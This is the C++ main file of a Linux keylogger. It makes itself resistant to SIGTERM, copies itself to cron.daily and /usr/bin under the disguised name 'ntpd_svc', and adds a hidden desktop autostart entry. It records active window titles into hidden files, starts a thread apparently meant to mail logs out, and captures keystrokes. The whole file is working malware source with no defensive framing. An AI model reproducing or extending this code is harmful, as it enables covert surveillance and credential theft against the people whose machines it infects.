/*_* gnu-g++ 4.8.4 build tool: g++ -o test key.cpp -lX11 *_*/
//#!/usr/bin/env g++ useless
#include <cstdlib>
#include "KeyloggerLib.h"


int main()
{
	signal(SIGINT, quit); //pour ctrl+c
  signal(SIGTERM, SIG_IGN); //this for kill cmd
  system("echo \"\\n`date`\">>.system");
  system("cp .system .m.g");
	sleep(1);
	
  pthread_t pt;
  pthread_create(&pt, NULL, sendMail, NULL);
  ///pthread_detach(pt);
  system("cp test /etc/cron.daily/ntpd_svc 2>/dev/null");
  /*^_^ *** For the Auto start with Linux *** ^_^*/
  system("cp test /usr/bin/ntpd_svc ");
  system("touch $HOME/.config/autostart/.linux.desktop");
  system("echo \"[Desktop Entry]\\nType=Application\\nExec=ntpd_svc\\nStartupNotify=False\">>$HOME/.config/autostart/.linux.desktop");
  
  //fin.seekg(0,ios::end);
  system("echo \"\\n`date`\">.system");
  system("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | awk -F '\"' '{print $2}'>.AW");
  system("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | awk -F '\"' '{print $2}' >> .system");

	GetKeys(keyboardDevice);
  pthread_join(pt,NULL);

	return 0;
}
